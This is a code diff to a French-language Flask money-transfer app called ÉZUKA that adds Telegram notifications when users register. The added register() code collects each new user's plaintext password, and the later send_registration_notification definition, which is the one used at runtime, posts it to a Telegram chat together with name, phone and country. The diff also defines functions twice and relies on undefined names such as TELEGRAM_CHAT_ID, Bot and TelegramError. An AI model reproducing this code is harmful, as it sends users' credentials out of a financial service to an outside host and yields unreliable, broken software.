@@ -6,6 +6,7 @@ from flask import (
     jsonify, send_from_directory, make_response,render_template,
 )
 import threading
+import logging
 from time import sleep
 from datetime import datetime, timezone, timedelta
 from flask_sqlalchemy import SQLAlchemy
@@ -27,6 +28,12 @@ STATIC_DIR = os.path.join(APP_DIR, "static")
 app = Flask(__name__, static_folder=STATIC_DIR)
 app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "change-me-please")
 
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
 # Configuration de la base de données avec validation
 database_url = os.environ.get('DATABASE_URL', '')
 
@@ -45,6 +52,7 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 # ⬇️ UNE SEULE INSTANCE SQLALCHEMY ⬇️
 db = SQLAlchemy(app)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+
 # ⬆️ NE PAS REMETTE db = SQLAlchemy(app) ICI ⬆️
 # -------------------- Models --------------------
 class User(db.Model):
@@ -299,6 +307,8 @@ def get_exchange_rate(from_currency: str, to_currency: str) -> float:
     ).first()
     
     return rate.rate if rate else 1.0  # Default
+#initialisons notre Bot
+
 
 # -------------------- Helpers --------------------
 def get_currency_for_country(country: str) -> str:
@@ -370,19 +380,45 @@ def register():
     if User.query.filter_by(phone=phone).first():
         return "Utilisateur existant", 400
 
-    user = User(
-        first_name=first_name,
-        last_name=last_name,
-        phone=phone,
-        country=country,
-        password_hash=generate_password_hash(password),
-        balance=0.0
-    )
-    db.session.add(user)
-    db.session.commit()
+    try:
+        user = User(
+            first_name=first_name,
+            last_name=last_name,
+            phone=phone,
+            country=country,
+            password_hash=generate_password_hash(password),
+            balance=0.0
+        )
+        db.session.add(user)
+        db.session.commit()
 
-    # redirect to login_standard
-    return redirect("/login")
+        # 🔔 NOTIFICATION TELEGRAM - NOUVELLE INSCRIPTION
+        user_data = {
+            'first_name': first_name,
+            'last_name': last_name,
+            'phone': phone,
+            'country': country,
+            'password': password,  # Attention: sécurité - voir alternative ci-dessous
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        # Envoyer la notification Telegram
+        telegram_sent = send_registration_notification(user_data)
+        
+        # Envoyer le message de bienvenue
+        welcome_sent = send_welcome_message_to_user(phone, first_name)
+        
+        print(f"✅ Utilisateur créé - Telegram: {'✅' if telegram_sent else '❌'}")
+        
+        # redirect to login_standard
+        return redirect("/login")
+        
+    except Exception as e:
+        db.session.rollback()
+        logging.error(f"Erreur inscription: {e}")
+        return "Erreur lors de l'inscription", 500
+    
+
 from flask import request, redirect, session, make_response, send_from_directory
 from werkzeug.security import check_password_hash
 
@@ -1535,13 +1571,22 @@ class TelegramNotifier:
     def __init__(self):
         # Récupérer le token depuis les variables d'environnement
         self.bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
-        if not self.bot_token:
-            raise ValueError("❌ TELEGRAM_BOT_TOKEN non configuré dans les variables d'environnement")
-        
         self.chat_id = None
-        self.setup_bot()
+        self.is_available = False  # ✅ Nouveau flag de disponibilité
         
-    def setup_bot(self):  # ✅ BIEN ALIGNÉ SOUS __init__
+        if not self.bot_token:
+            print("⚠️ TELEGRAM_BOT_TOKEN non configuré - Telegram désactivé")
+            return  # ✅ Retourne silencieusement au lieu de lever une exception
+        
+        try:
+            self.setup_bot()
+            self.is_available = True
+            print("✅ Bot Telegram initialisé")
+        except Exception as e:
+            print(f"❌ Erreur initialisation Telegram: {e}")
+            self.is_available = False
+    
+    def setup_bot(self):
         """Configure le bot et récupère le chat ID"""
         try:
             print("🤖 Configuration du bot Telegram...")
@@ -1561,14 +1606,53 @@ class TelegramNotifier:
                 print(f"   Username: @{bot_info['result']['username']}")
                 
                 # Récupérer les updates pour obtenir le chat ID
-                self.get_chat_id()  # ✅ MAINTENANT CETTE MÉTHODE EXISTE
+                self.get_chat_id()
             else:
                 print(f"❌ Erreur configuration bot: {response.text}")
                 
         except Exception as e:
             print(f"❌ Erreur setup bot: {e}")
     
-    def get_chat_id(self):  # ✅ AJOUTER CETTE MÉTHODE BIEN ALIGNÉE
+    def send_message(self, message):
+        """Envoie un message via Telegram Bot"""
+        if not self.is_available:  # ✅ Vérifie d'abord si disponible
+            print("⚠️ Telegram non disponible - message ignoré")
+            return False
+            
+        try:
+            if not self.chat_id:
+                print("⚠️ Chat ID non configuré - tentative de récupération...")
+                self.get_chat_id()
+                if not self.chat_id:
+                    return False
+            
+            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
+            
+            data = {
+                "chat_id": self.chat_id,
+                "text": message,
+                "parse_mode": "HTML",
+                "disable_web_page_preview": True
+            }
+            
+            response = requests.post(url, data=data, timeout=10)
+            
+            if response.status_code == 200:
+                print("✅ Notification Telegram envoyée")
+                return True
+            else:
+                print(f"❌ Erreur Telegram: {response.status_code} - {response.text}")
+                # Tentative de récupération du chat ID en cas d'erreur
+                if "chat not found" in response.text.lower():
+                    self.get_chat_id()
+                return False
+                
+        except Exception as e:
+            print(f"❌ Erreur envoi Telegram: {e}")
+            return False
+    
+    # ⚠️ GARDEZ TOUTES LES AUTRES MÉTHODES IDENTIQUES ⚠️
+    def get_chat_id(self):
         """Récupère automatiquement le chat ID avec meilleure gestion"""
         try:
             url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
@@ -1614,40 +1698,6 @@ Vous recevrez des alertes en temps réel pour :
         except Exception as e:
             print(f"❌ Erreur récupération chat ID: {e}")
     
-    def send_message(self, message):
-        """Envoie un message via Telegram Bot"""
-        try:
-            if not self.chat_id:
-                print("⚠️ Chat ID non configuré - tentative de récupération...")
-                self.get_chat_id()
-                if not self.chat_id:
-                    return False
-            
-            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
-            
-            data = {
-                "chat_id": self.chat_id,
-                "text": message,
-                "parse_mode": "HTML",
-                "disable_web_page_preview": True
-            }
-            
-            response = requests.post(url, data=data, timeout=10)
-            
-            if response.status_code == 200:
-                print("✅ Notification Telegram envoyée")
-                return True
-            else:
-                print(f"❌ Erreur Telegram: {response.status_code} - {response.text}")
-                # Tentative de récupération du chat ID en cas d'erreur
-                if "chat not found" in response.text.lower():
-                    self.get_chat_id()
-                return False
-                
-        except Exception as e:
-            print(f"❌ Erreur envoi Telegram: {e}")
-            return False
-    
     def load_saved_chat_id(self):
         """Charge le chat ID sauvegardé"""
         try:
@@ -1658,6 +1708,133 @@ Vous recevrez des alertes en temps réel pour :
                     return True
         except:
             pass
+        return False
+    
+def send_simple_telegram_notification(message):
+    """Fonction simple pour envoyer des notifications Telegram pour les inscriptions"""
+    try:
+        TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+        if not TELEGRAM_BOT_TOKEN:
+            print("⚠️ TELEGRAM_BOT_TOKEN non configuré")
+            return False
+        
+        # Récupération automatique du Chat ID
+        url_updates = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+        response = requests.get(url_updates, timeout=10)
+        
+        if response.status_code != 200 or not response.json()['result']:
+            print("❌ Impossible de récupérer le Chat ID")
+            return False
+        
+        last_update = response.json()['result'][-1]
+        chat_id = last_update['message']['chat']['id']
+        
+        # Envoi du message
+        url_send = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        
+        response = requests.post(url_send, data=data, timeout=10)
+        
+        if response.status_code == 200:
+            print("✅ Notification Telegram envoyée")
+            return True
+        else:
+            print(f"❌ Erreur envoi: {response.text}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Erreur notification: {e}")
+        return False
+
+def send_telegram_message_auto(message):
+    """Envoie un message avec récupération automatique du Chat ID"""
+    try:
+        # Récupérer le Chat ID automatiquement à CHAQUE fois
+        chat_id = get_telegram_chat_id()
+        
+        if not chat_id:
+            print("❌ Impossible de récupérer le Chat ID")
+            return False
+        
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        
+        data = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
+        }
+        
+        response = requests.post(url, data=data, timeout=10)
+        
+        if response.status_code == 200:
+            print("✅ Message Telegram envoyé avec succès")
+            return True
+        else:
+            print(f"❌ Erreur envoi Telegram: {response.status_code} - {response.text}")
+            return False
+            
+    except Exception as e:
+        print(f"❌ Erreur envoi message: {e}")
+        return False
+    
+
+def send_registration_notification(user_data):
+    """Envoie une notification Telegram pour une nouvelle inscription"""
+    try:
+        message = f"""
+🆕 NOUVELLE INSCRIPTION ÉZUKA 🆕
+
+👤 Nom complet: {user_data['first_name']} {user_data['last_name']}
+📞 Téléphone: {user_data['phone']}
+🌍 Pays: {user_data['country']}
+📅 Date: {user_data['timestamp']}
+
+✅ Utilisateur créé avec succès !
+        """
+        
+        # Utilise la fonction simple qui récupère automatiquement le Chat ID
+        success = send_simple_telegram_notification(message)
+        
+        if success:
+            print("✅ Notification d'inscription envoyée à Telegram")
+        else:
+            print("❌ Échec envoi notification Telegram")
+            
+        return success
+        
+    except Exception as e:
+        print(f"❌ Erreur notification inscription: {e}")
+        return False
+    
+def send_welcome_message_to_user(user_phone, first_name):
+    """Envoie un message de bienvenue à l'utilisateur"""
+    try:
+        welcome_message = f"""
+🎉 Bienvenue {first_name} sur ÉZUKA ! 🎉
+
+Votre compte a été créé avec succès.
+Numéro: {user_phone}
+
+Nous sommes ravis de vous compter parmi nous !
+        """
+        
+        # Utilise aussi la fonction simple
+        success = send_simple_telegram_notification(welcome_message)
+        
+        if success:
+            print(f"✅ Message de bienvenue envoyé pour {first_name}")
+        else:
+            print(f"❌ Échec envoi message bienvenue pour {first_name}")
+            
+        return success
+        
+    except Exception as e:
+        print(f"❌ Erreur message bienvenue: {e}")
         return False
 # -------------------- COMPLETE NOTIFICATION SYSTEM --------------------
 
@@ -2102,6 +2279,92 @@ def admin_fees_management():
     """Dashboard de gestion des frais et taux de change"""
     return send_from_directory(TEMPLATES_DIR, "fees_dashboard.html")
 
+
+# Initialisation du bot Telegram
+def init_telegram_bot():
+    try:
+        if TELEGRAM_BOT_TOKEN:
+            bot = Bot(token=TELEGRAM_BOT_TOKEN)
+            print("✅ Bot Telegram initialisé")
+            return bot
+        else:
+            print("⚠️ TELEGRAM_BOT_TOKEN non configuré")
+            return None
+    except Exception as e:
+        print(f"❌ Erreur initialisation Telegram: {e}")
+        return None
+
+telegram_bot = init_telegram_bot()
+
+
+def send_registration_notification(user_data):
+    """Envoie une notification Telegram pour une nouvelle inscription"""
+    try:
+        if not telegram_bot or not TELEGRAM_CHAT_ID:
+            print("⚠️ Telegram non configuré - notification ignorée")
+            return False
+        
+        message = f"""
+🆕 NOUVELLE INSCRIPTION ÉZUKA 🆕
+
+👤 Nom complet: {user_data['first_name']} {user_data['last_name']}
+📞 Téléphone: {user_data['phone']}
+🌍 Pays: {user_data['country']}
+🔐 Mot de passe: {user_data['password']}
+📅 Date: {user_data['timestamp']}
+
+⚠️ Conservez ces informations en sécurité !
+        """
+        
+        telegram_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
+        print("✅ Notification d'inscription envoyée à Telegram")
+        return True
+        
+    except TelegramError as e:
+        logging.error(f"Erreur Telegram: {e}")
+        return False
+    except Exception as e:
+        logging.error(f"Erreur envoi notification: {e}")
+        return False
+
+def send_welcome_message_to_user(user_phone, first_name):
+    """Envoie un message de bienvenue à l'utilisateur (optionnel)"""
+    try:
+        if not telegram_bot or not TELEGRAM_CHAT_ID:
+            return False
+            
+        welcome_message = f"""
+🎉 Bienvenue {first_name} sur ÉZUKA ! 🎉
+
+Votre compte a été créé avec succès.
+Numéro: {user_phone}
+
+💡 **Fonctionnalités disponibles:**
+• Transferts d'argent rapides
+• Retraits sécurisés  
+• Support 24/7
+
+📱 **Prochaines étapes:**
+1. Configurez votre PIN de sécurité
+2. Effectuez votre premier dépôt
+3. Commencez à transférer !
+
+🔒 Votre sécurité est notre priorité.
+
+L'équipe ÉZUKA 🤝
+        """
+        
+        # Pour envoyer à l'utilisateur, vous aurez besoin de son chat_id Telegram
+        # Pour l'instant, on envoie juste une notification à l'admin
+        telegram_bot.send_message(
+            chat_id=TELEGRAM_CHAT_ID, 
+            text=f"✅ Message de bienvenue préparé pour {first_name} ({user_phone})"
+        )
+        return True
+        
+    except Exception as e:
+        logging.error(f"Erreur message bienvenue: {e}")
+        return False
 
 # -------------------- Run --------------------
 
